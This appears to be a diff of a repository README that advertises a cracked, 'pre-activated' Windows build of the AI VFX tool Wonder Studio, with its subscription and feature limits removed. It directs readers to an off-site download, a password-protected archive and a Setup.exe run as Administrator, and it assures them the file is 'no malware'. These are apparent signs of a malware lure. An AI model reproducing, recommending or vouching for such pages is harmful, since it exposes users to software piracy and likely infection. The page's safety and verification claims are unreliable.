@@ -1,41 +1,99 @@
 ```
-___    ____   _    _________  __
+    ___    ____   _    _________  __
    /   |  /  _/  | |  / / ____/ |/ /
   / /| |  / /    | | / / /_   |   / 
  / ___ |_/ /     | |/ / __/  /   |  
 /_/  |_/___/     |___/_/    /_/|_|
 ```
 
-# AI VFX
+# AI VFX (Wonder Studio) — Full Build [2026]
 
-> wonder dynamics, ai visual effects, ai cg replacement, ai 3d characters.
-
-**wonder-studio** | **ai-vfx** | **visual-effects** | **3d-characters** | **ai-filmmaking**
+> AI VFX (Wonder Studio) | Windows 10/11 x64 | All Features | Pre-Activated
 
 ---
 
-## About
+### Release Info
 
-- wonder dynamics, ai visual effects, ai cg replacement, ai 3d characters.
-- Full build: wonder dynamics, ai visual effects, ai cg replacement, ai 3d characters, ai film making.
-- Platform: Windows macOS
-
-**Platform:** Windows macOS
+| | |
+|---|---|
+| **Software** | AI VFX (Wonder Studio) |
+| **Type** | Full Pre-Activated Build |
+| **Platform** | Windows 10/11 x64 |
+| **Build** | Full — All Features |
+| **Status** | ✅ Working (verified June 2026) |
 
 ---
 
-## Download
-
-### [AI VFX — Download Latest Version](https://telegra.ph/Download-06-01-11)
+### What's Included
 
 ```
-  ✦ AI VFX
-  ✦ Free & Safe Download
-  ✦ Latest Version
+[✓] Ai Vfx
+[✓] Wonder Dynamics
+[✓] Ai Visual Effects
+[✓] Ai Cg Replacement
+[✓] Ai 3D Characters
+[✓] Ai Film Making
+[✓] Ai Movie Effects
+[✓] Windows 10/11 x64 compatible
+[✓] Pre-activated — no key needed
+[✓] Clean build — no bloatware
 ```
 
-**[⬇ DOWNLOAD](https://telegra.ph/Download-06-01-11)**
+### What's Removed
+
+```
+[x] Subscription / monthly payment
+[x] Usage limits and restrictions  
+[x] Feature gates (Pro/Premium → open)
+[x] Trial limitations
+```
 
 ---
 
-**Tags:** `wonder-studio` `ai-vfx` `visual-effects` `3d-characters` `ai-filmmaking`
+### System Requirements
+
+```
+OS:     Windows 10/11 x64
+RAM:    8 GB minimum (16 GB recommended)
+Disk:   1 GB free space
+Net:    Required for AI features
+```
+
+---
+
+### How to Install
+
+```
+1. Download from the link below
+2. Extract archive (password if needed: 2026)
+3. Run Setup.exe as Administrator
+4. Follow installer steps
+5. Launch — all features active
+```
+
+---
+
+<p align="center">
+
+### ⬇️ [DOWNLOAD AI VFX — FULL BUILD](https://softmixonline.github.io/download/)
+
+</p>
+
+---
+
+### Verified
+
+```
+Tested:    June 2026
+OS:        Windows 11 23H2 x64
+Result:    ✅ All features working
+Build:     Clean, verified, no malware
+```
+
+---
+
+`wonder-studio` `ai-vfx` `visual-effects` `3d-characters` `ai-filmmaking` `windows` `setup` `installer`
+
+---
+
+wonder studio, ai vfx, wonder dynamics, ai visual effects, ai cg replacement, ai 3d characters, ai film making, ai movie effects, wonder studio review, ai special effects
